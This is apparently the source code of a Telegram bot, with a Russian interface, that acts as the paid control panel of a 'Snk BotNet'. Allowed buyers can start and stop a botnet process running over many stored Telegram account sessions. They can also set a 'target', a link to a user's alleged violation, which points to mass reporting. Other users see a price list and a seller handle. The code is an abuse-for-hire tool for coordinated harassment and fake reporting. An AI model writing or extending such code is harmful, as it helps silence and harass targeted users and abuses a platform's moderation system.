import subprocess
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import CommandStart
from data import config
from utils import logger
import os
import json
import logging
from telethon import TelegramClient
import time
from pathlib import Path
from datetime import datetime, timedelta
import asyncio
from aiogram.dispatcher.filters.state import State, StatesGroup

session_dir = "sessions"
TOKEN = config.bot_token
bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
active_processes = []
ADMIN_IDS = [6582382945]

class UserStates(StatesGroup):
    waiting_for_text = State()
    waiting_for_chat_id = State()

with open('data/allowed_users.json', 'r') as f:
    data = json.load(f)
    allowed_user_ids = data['allowed_ids']

async def run_python_file(message: types.Message, state: FSMContext):
    global active_processes
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("Назад", callback_data="back"))
        if not active_processes:
            process = subprocess.Popen(['python', 'utils/main.py'])
            active_processes.append(process)
            await message.edit_text("✅Запустил ботнет", reply_markup=keyboard)
        else:
            await message.edit_text("❌Ботнет уже запущен.", reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Произошла ошибка при запуске ботнета: {e}")
        await message.edit_text(f"⚠Произошла ошибка при запуске ботнета: {e}", reply_markup=keyboard)


async def stop_processes(message: types.Message, state: FSMContext):
    global active_processes
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
        types.InlineKeyboardButton("Назад", callback_data="back"))
        if active_processes:
            while active_processes:
                process = active_processes.pop()
                if process.poll() is None:
                    process.terminate()
                    process.wait()
                    await message.edit_text("✅Ботнет остановлен", reply_markup=keyboard)
                else:
                    await message.edit_text("❌ботнет и так не запущен", reply_markup=keyboard)
        else:
            await message.edit_text("❌Ботнет и так не запущен.", reply_markup=keyboard)
    except Exception as e:
        logger.error(f"⚠Произошла ошибка при остановке ботнета: {e}")
        await message.edit_text(f"⚠Произошла ошибка при остановке ботнета: {e}", reply_markup=keyboard)


async def start(message: types.Message):
    user_id = message.from_user.id
    if user_id not in allowed_user_ids:
        with open("data/vid.mp4", "rb") as video:
            await message.answer_video(video, caption="Извините, у вас нет доступа к этому боту.\nПриобретите его у @ZXC_CEHOKOC\n\nПрайс:\nНеделя - 5$\nМесяц - 10$\nНавсегда - 20$", parse_mode="HTML")
        return
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("Вкл ботнет", callback_data="start"),
            types.InlineKeyboardButton("Откл ботнет", callback_data="stop"),
        types.InlineKeyboardButton("Обновить цель", callback_data="update_text"),
        types.InlineKeyboardButton("Текущая цель", callback_data="show_text")
    )
        sessions_dir = Path("sessions")
        session_files = list(sessions_dir.glob("*.session"))
        session_names = [file.stem for file in session_files]
        count_s = len(session_names)
        logger.info(f"Доступно сессий: {count_s}")

        account_text = "аккаунт"
        if count_s != 1:
            account_text = "аккаунта" if count_s < 5 else "аккаунтов"
            
        await message.answer(f"📱\n├Snk BotNet:\n└В боте {count_s} {account_text}", reply_markup=keyboard)

    except Exception as e:
        logger.error(f"⚠Произошла ошибка при отправке сообщения: {e}")
        await message.answer(f"⚠Произошла ошибка при отправке сообщения: {e}")
        
async def backing(message: types.Message):
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("Вкл ботнет", callback_data="start"),
            types.InlineKeyboardButton("Откл ботнет", callback_data="stop"),
            types.InlineKeyboardButton("Обновить цель", callback_data="update_text"),
            types.InlineKeyboardButton("Текущая цель", callback_data="show_text")
        )

        sessions_dir = Path("sessions")
        session_files = list(sessions_dir.glob("*.session"))
        session_names = [file.stem for file in session_files]
        count_s = len(session_names)
        logger.info(f"Доступно сессий: {count_s}")

        account_text = "аккаунт"
        if count_s != 1:
            account_text = "аккаунта" if count_s < 5 else "аккаунтов"

        msg = await message.edit_text(
            f"📱\n├Snk BotNet:\n└В боте {count_s} {account_text}",
            reply_markup=keyboard
        )

        message_id = msg.message_id

    except Exception as e:
        logger.error(f"⚠Произошла ошибка при отправке сообщения: {e}")
        await message.edit_text(f"⚠Произошла ошибка при отправке сообщения: {e}", reply_markup=keyboard)


async def button_click(callback_query: types.CallbackQuery, state: FSMContext):
    try:
        if callback_query.data == "start":
            await run_python_file(callback_query.message, state)
        elif callback_query.data == "stop":
            await stop_processes(callback_query.message, state)
        elif callback_query.data == "update_text":
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                types.InlineKeyboardButton("Назад", callback_data="back"))
            await callback_query.message.edit_text("Отправьте ссылку на нарушение пользователем:", reply_markup=keyboard)
            await state.set_state(UserStates.waiting_for_text.state)
        elif callback_query.data == "show_text":
            await show_current_text(callback_query.message, state)
        elif callback_query.data == "back":
            await backing(callback_query.message)
    except Exception as e:
        logger.error(f"⚠️Произошла ошибка при обработке кнопки: {e}")
        await callback_query.message.answer(f"⚠️Произошла ошибка при обработке кнопки: {e}")


async def show_current_text(message: types.Message, state: FSMContext):
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
        types.InlineKeyboardButton("Назад", callback_data="back"))
        with open("data/text.json", "r", encoding="utf-8") as f:
            data = json.load(f)
            text = data["text"]
        await message.edit_text(f"Текущая цель:\n\n{text}", reply_markup=keyboard)
    except Exception as e:
        logger.error(f"⚠️Произошла ошибка при чтении текста: {e}")
        await message.edit_text(f"⚠️Произошла ошибка при чтении текста: {e}", reply_markup=keyboard)


async def text_handler(message: types.Message, state: FSMContext):
    try:
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
        types.InlineKeyboardButton("Назад", callback_data="back"))
        if await state.get_state() == UserStates.waiting_for_text.state:
            new_text = message.text
            with open("data/text.json", "w") as f:
                json.dump({"text": new_text}, f)
            await message.answer(f"📰Новая цель для ботнета: {new_text}", reply_markup=keyboard)
            await state.finish()
        elif await state.get_state() == UserStates.waiting_for_chat_id.state:
            await save_chat_id(message, state)
    except Exception as e:
        logger.error(f"⚠️Произошла ошибка при обработке текста: {e}")
        await message.edit_text(f"⚠️Произошла ошибка при обработке текста: {e}", reply_markup=keyboard)

def register_handlers(dp: Dispatcher):
    dp.register_message_handler(start, CommandStart())
    dp.register_callback_query_handler(button_click, state="*")
    dp.register_message_handler(text_handler, state=UserStates.waiting_for_text)
    dp.register_message_handler(text_handler, state=UserStates.waiting_for_chat_id)

async def main():
    register_handlers(dp)
    await dp.start_polling()

if __name__ == '__main__':
    asyncio.run(main())